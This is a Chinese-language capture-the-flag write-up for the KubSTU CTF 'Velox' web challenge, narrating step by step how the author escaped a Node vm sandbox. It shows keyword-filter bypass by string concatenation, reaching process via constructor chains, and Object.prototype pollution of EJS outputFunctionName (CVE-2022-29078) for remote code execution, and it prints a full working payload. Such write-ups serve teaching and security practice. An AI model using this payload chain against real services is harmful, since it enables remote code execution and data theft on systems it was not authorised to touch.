# Velox

> **分类：** Web · **赛事：** KubSTU CTF 2026 Autumn · **难度：** Medium · **Flag 格式：** `kubstu{...}`

## 📌 题目

KubSTU 团队在 meetup 上喝到第五杯 raf 之后，认定临时拼凑 CTF 题目太 cringe，于是搞了个**创业项目**。名字叫「Velox」——「通过用户 JavaScript 进行数据转换的云平台」。SberProducts 的投资人已经为之倾倒，T-Bank 抛来了 offer，Yandex 正打算用一份沙威玛加一年的 Plus 订阅把它买下来。

服务能跑。落地页很漂亮。有注册。有仪表盘。有文件上传。能改资料。一切都合规，一切都在 prod，一切都「安全」——米哈雷奇亲口说的，而米哈雷奇干 SecOps 三年了，他懂。

某处藏着出题方的 flag。机房里的水豚们声称 sandbox「很牢靠」，「你们啥也找不到，喝咖啡去吧」。不过水豚们也说过「`npm install` 马上就构建好」——然后我们就都在这儿了。

把 flag 找出来。别问它在哪。要是我们知道——就不会出这道题了。

**链接：** `<待下发>`

---

*P.S. 本服务做了反爬虫。如果你的 `python-requests` 脚本吃了个 `403`——那不是 bug，是 feature。真正的黑客用浏览器。真正的水豚——两样都用。*

*P.P.S. 接口 fuzzing 阶段也考虑到了。Gosha 睡着了，但 tarpit 从不睡觉。*

## 🏁 解题思路

这不是一份参考手册，而是一个关于我如何一步步拿到 flag 的故事：我试了什么、什么没用、那一刻我在想什么、接下来又往哪里走。

---

### 第 0 步. 打开网站

给了一个链接 `http://target:3000/`。打开——「Velox」落地页，「通过用户 JavaScript 进行数据转换的云平台」。按钮：登录、注册。

第一个念头很简单：**既然服务在服务器上执行用户的 JS——这就是一道 sandbox escape**。整道题很可能就归结为从这个「沙箱」里逃出来，并在文件系统上读到点什么。具体读什么、怎么读我还不知道——先去看看。

我注册。这里是第一个惊喜：表单在你解出一个 Proof-of-Work（hashcash）并通过某种「浏览器检查」之前不会提交。我拿真实浏览器，开启 JS——通过了。用 `curl`/脚本在这里会绊倒，但我是人，我无所谓。我用账号登进去。

---

### 第 1 步. 在仪表盘里四处看看

里面有三个标签页：

- **Transforms** —— 创建并运行一个 JS 变换。
- **Data Sources** —— 文件上传。
- **Settings** —— 资料、email、密码。

我立刻试着弄清楚漏洞住在哪里。逻辑告诉我：唯一一个**我的代码在服务器上运行**的地方就是 Transforms。其余的（上传、资料）多半是用来分散注意力的装饰。但我没把它们丢掉，而是先搁到一边——要是主路线走进死胡同，我再回来查它们。

我创建一个变换 → 打开一个带两个字段的编辑器：`input_json`（输入数据）和 `code`（真正的 JS）。提交发往 `POST /transforms/{id}/run`，结果显示在「Output」块里。

---

### 第 2 步. 摸一摸 sandbox

先来个平淡的：我写 `1+1` → 得到 `2`。能用。

现在我需要搞清楚**我在里面手头有什么**。我写：

```js
Object.keys(this).join(',')
```

得到：
```
input,Math,parseInt,parseFloat,isNaN,isFinite,undefined,NaN,Infinity,encodeURIComponent,decodeURIComponent
```

这里是关键的一刻。我本以为会看到 `Object`、`String`、`Array`、`JSON`——标准的全局对象。**它们都不在。**作者有意把除了 `input`（我的数据）和一两个数学工具之外的一切都清掉了。

这说明什么？他们知道 sandbox 很弱，正试图让生活更难受。也就是说，经典路径 `process.mainModule.require(...)` 我没法直接写——既没有 `process`，也没有 `require`。我得先**够到宿主（host）对象**。

---

### 第 3 步. 撞上一个关键字过滤器

我试：

```js
typeof process
```

得到：`Expression contains restricted syntax`。

啊哈，一个**过滤器**。我查查还有什么被禁：`require`、`constructor`、`prototype`、`Function`、`eval`、`global`、`globalThis`、`mainModule`、`execSync`、`spawnSync`、`exec`、`spawn`、`__proto__`——全被拦。Unicode 和 hex 转义也是。

我得出结论：这个过滤器是对源码做的一个**正则**，按整词（`\b...\b`）查找，外加 `__proto__`。这很重要，因为正则看的是**文本**，而不是 JS 会如何去求值它。如果我能把一个被禁的词**在运行时用碎片拼出来**——正则就看不见它。

---

### 第 4 步. 用拼接绕过过滤器

我试着用两个字符串拼出 `constructor`：

```js
var a="con"; var b="structor";
input[a+b]
```

没被拦。而且它给我返回了 `Object`——因为 `input` 是一个对象，它有一条原型链：`input.constructor` → 宿主的 `Object`。

**这就是第一个真正的突破。**通过 `input.constructor` 我够到了宿主对象，尽管 `Object` 不在全局里，而且词 `constructor` 被拦。拼接骗过了正则，原型链骗过了全局对象的缺失。

从这里起合乎逻辑的下一步：`input.constructor.constructor`——这已经是宿主的 `Function` 了。而 `Function("return process")()` 是从 JS 任何地方取出 `process` 的经典办法。

---

### 第 5 步. 取出 process——却撞上空的 FLAG

我拼出：

```js
var a="con"; var b="structor";
var F = parseInt[a+b];              // parseInt.constructor → Function
var p = F("return pro"+"cess")();   // Function("return process")() → process
p.env.FLAG
```

返回了一个空字符串。

起初我想——也许变量名不一样。我枚举 `env`，看键——没有。**flag 不在环境里。**作者把它从那儿清掉了。

好吧，那 flag 不在 env。那在哪？合乎逻辑的结论：**在文件系统上某处**，而且得把它读出来。标准 CTF 套路——一个权限为 `0400 root:root` 的 `/flag` 文件，加上一个读它的 SUID 助手。我验证这个假设：尝试调用 `child_process.execSync('/usr/local/bin/readflag')`（同样用拼接来绕过过滤器）。

---

### 第 6 步. 调用 readflag——却撞上输出清洗器（output sanitizer）

我写：

```js
var a="con"; var b="structor";
var F = parseInt[a+b];
var p = F("return pro"+"cess")();
p["main"+"Module"]["re"+"quire"]("child_"+"pro"+"cess")["exe"+"cSy"+"nc"]("/usr/local/bin/readflag").toString()
```

然后我得到：`[output filtered — restricted content detected]`。

**一个新惊喜：**作者在**输出上挂了一个清洗器**。它检查我的代码返回了什么，并把一切看起来像 flag 的东西都砍掉——明文、反转的字符串、hex、charcode 数组。我连 Caesar +1 都试了——照砍不误。他们检查全部 256 种位移。

这里我坐下来想。从 sandbox 直接 return **根本行不通**——无论我返回什么，只要里面有 flag，就会被砍。所以**我需要一个 side-channel**——一个把 flag 从 Output 块之外导出去的办法。

---

### 第 7 步. 关键洞见：flag 必须落进 HTML，而不是 Output

我知道结果是通过 EJS 渲染的（从页面结构，以及 `package.json`/报错里露出的 `ejs 3.1.6` 可以看出来）。这时 **CVE-2022-29078** 浮现在我脑海——这是 EJS 经由 `outputFunctionName` 的一个漏洞。

该 CVE 的要点：当 EJS 编译一个模板时，它会生成一个形如下面的字符串

```js
var <outputFunctionName> = '';
```

然后把输出累积进去。如果攻击者能**污染 `Object.prototype.outputFunctionName`**，就能往那里塞进任意 JS——它会在渲染时执行。而最关键的是：结果落进了**页面的 HTML**，而不是 Output 块。而清洗器只检查 Output 块。于是 flag 会穿过渲染，出现在页面源码里。

这正是关键的转折：我不再试图把 flag 从 sandbox **返回**出来，而是开始**污染原型**，好让 flag 在下一次渲染时自己打印出来。

---

### 第 8 步. 构造 payload

先拿到宿主的 `Object.prototype`（用同样的拼接）：

```js
var a="con"; var b="structor"; var c="pro"; var d="totype";
var proto = input[a+b][c+d];   // Object.prototype
```

现在要弄清楚该往 `outputFunctionName` 里放**哪个字符串**，才能让 EJS 正确地「插入」它，同时又让我的代码执行。EJS 会把这个值当作函数名放进去：

```js
var <МОЯ_СТРОКА> = '';
```

也就是说，我需要闭合这个声明（`_tmp;`），执行我的代码，把结果追加进 `__output`（EJS 的累积变量），再打开一个新的合法声明（`var _tmp2`），这样语法才不会坏。

我拼出：

```js
proto.outputFunctionName =
  '_tmp;try{__output+='
  + 'process' + '.'
  + 'mainModule' + '.'
  + 'require' + "('" + 'child_process' + "')['"
  + 'execSync' + "']('" + '/usr/local/bin/readflag' + "').toString()}"
  + 'catch(e){};var _tmp2';
```

（所有危险的词都是用拼接组装的，以绕过正则过滤器。）

我从 sandbox 返回一个空字符串 `""`，好让清洗器满意。

---

### 第 9 步. 运行并查看 View Source

我把 payload 粘进「Code」字段，往 `input_json` 里放 `{}`，点 Run。

Output 块是空的（正如设计的那样）。**但我打开页面的 View Source**——就在那里，HTML 里，躺着 flag：

```
kubstu{vm_1s_n0t_a_s4ndb0x_pr0t0typ3_p0llut10n_2_rce}
```

搞定。

---

### 我一路上是怎么推理的——简述

1. **「服务器上的用户 JS」** → 所以目标是 sandbox escape。
2. **被清空的全局对象** → 作者知道 sandbox 的弱点，得走原型链。
3. **基于正则的关键字过滤器** → 用运行时字符串拼接绕过。
4. **`input.constructor` 给出宿主 `Object`** → 第一个真正的突破，够到了宿主。
5. **`process.env.FLAG` 为空** → flag 不在环境里，那就在某个文件里。
6. **`readflag` 被清洗器砍掉** → 直接 return 行不通，需要 side-channel。
7. **EJS 3.1.6 + CVE-2022-29078** → 污染 `Object.prototype.outputFunctionName`，flag 绕过清洗器进入 HTML。
8. **View Source** → flag。

---

### 完整 payload

```js
var a="con";var b="structor";var c="pro";var d="totype";var proto=input[a+b][c+d];var p=c+"cess";var m="mainM"+"odule";var r="re"+"quire";var ch="child_"+c+"cess";var es="exe"+"cSy"+"nc";var cmd="/usr/local/bin/readflag";proto.outputFunctionName="_tmp;try{__output+="+p+"."+m+"."+r+"('"+ch+"')['"+es+"']('"+cmd+"').toString()}catch(e){};var _tmp2";""
```

粘进「Code」字段，往 `input_json` 里放 `{}`，点 Run，打开页面源码。

---

### 一行概括的链条

```
конкатенация строк (обход regex) → vm sandbox escape через input.constructor
  → Object.prototype pollution → EJS outputFunctionName (CVE-2022-29078)
  → RCE при рендере → /usr/local/bin/readflag (SUID) → флаг в HTML
```

### 我没上当的假线索

- **Data Sources / 文件上传** —— 检查过，有防护：随机文件名、MIME 白名单、没有 path traversal。装饰。
- **Settings / 修改资料** —— CSRF、bcrypt，没有 XSS。装饰。
- **`process.env.FLAG`** —— 空的，env 被清了。
- **从 sandbox 直接返回 flag** —— 在所有编码下都被清洗器砍掉。
- **Unicode/hex 转义** —— 被过滤器拦掉。

这些都是作者放出来带偏方向的。真正的路线只有一条。

**Flag:** `kubstu{vm_1s_n0t_a_s4ndb0x_pr0t0typ3_p0llut10n_2_rce}`
